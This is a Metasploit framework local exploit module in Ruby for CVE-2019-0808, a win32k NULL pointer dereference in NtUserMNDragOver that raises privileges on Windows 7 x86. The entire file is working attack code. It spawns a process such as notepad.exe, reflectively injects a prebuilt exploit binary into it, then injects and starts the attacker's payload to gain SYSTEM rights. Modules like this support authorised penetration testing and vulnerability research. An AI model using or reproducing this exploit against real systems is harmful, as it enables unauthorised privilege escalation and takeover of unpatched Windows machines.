##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows NtUserMNDragOver Local Privilege Elevation',
      'Description'    => %q(
        This module exploits a null pointer deference in win32k triggered by the
        NTUserMNDragOver syscall.
        After receiving the menu window object returned by the window procedure function,
        the xxxMNFindWindowFromPoint function does not effectively check the validity of
        its member tagPOPUPMENU, causing the subsequent MNGetpItemFromIndex function to
        trigger the NULL pointer deference.
        This module has been tested against Windows 7 x86.
      ),
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'ClÃ©ment Lecigne', # discovery
          'Grant Willcox',   # exploit
          'timwr'            # msf module
        ],
      'Platform'       => 'win',
      'SessionTypes'   => ['meterpreter'],
      'Targets'        =>
        [
          ['Windows 7 x86', { 'Arch' => ARCH_X86 }]
        ],
      'References'     =>
        [
          ['CVE', '2019-0808'],
          ['URL', 'https://github.com/exodusintel/CVE-2019-0808'],
          ['URL', 'https://github.com/ze0r/cve-2019-0808-poc'],
          ['URL', 'http://blogs.360.cn/post/RootCause_CVE-2019-0808_EN.html'],
          ['URL', 'https://blog.exodusintel.com/2019/05/17/windows-within-windows/'],
        ],
      'Notes'          =>
        {
          'Reliability' => [ REPEATABLE_SESSION ]
        },
      'DisclosureDate' => 'Nov 26 2018',
      'DefaultTarget'  => 0,
    ))
    register_options([
      OptString.new('PROCESS', [true, 'Name of process to spawn and inject dll into.', "notepad.exe"])
    ])
  end

  def setup_process
    process_name = datastore['PROCESS']
    begin
      print_status("Launching #{process_name} to host the exploit...")
      launch_process = client.sys.process.execute(process_name, nil, 'Hidden' => false)
      process = client.sys.process.open(launch_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Sandboxes could not allow to create a new process
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_error('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end
    process
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if sysinfo['Architecture'] != ARCH_X86
      fail_with(Failure::NoTarget, 'Exploit code is 32-bit only')
    end

    process = setup_process
    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-0808', 'exploit.bin')
    library_path = ::File.expand_path(library_path)
    library_data = ::File.binread(library_path)
    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem = inject_into_process(process, library_data)
    process.thread.create(exploit_mem)
    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)
    process.thread.create(payload_mem)
  end
end
